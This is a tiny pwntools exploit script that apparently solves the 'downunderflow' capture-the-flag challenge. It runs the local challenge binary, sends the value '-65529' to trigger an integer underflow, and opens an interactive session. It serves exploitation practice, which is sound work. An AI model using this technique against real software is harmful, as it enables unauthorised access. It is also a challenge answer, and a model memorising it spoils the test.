from pwn import *

conn = process('../publish/downunderflow')
conn.sendline('-65529')
conn.interactive()
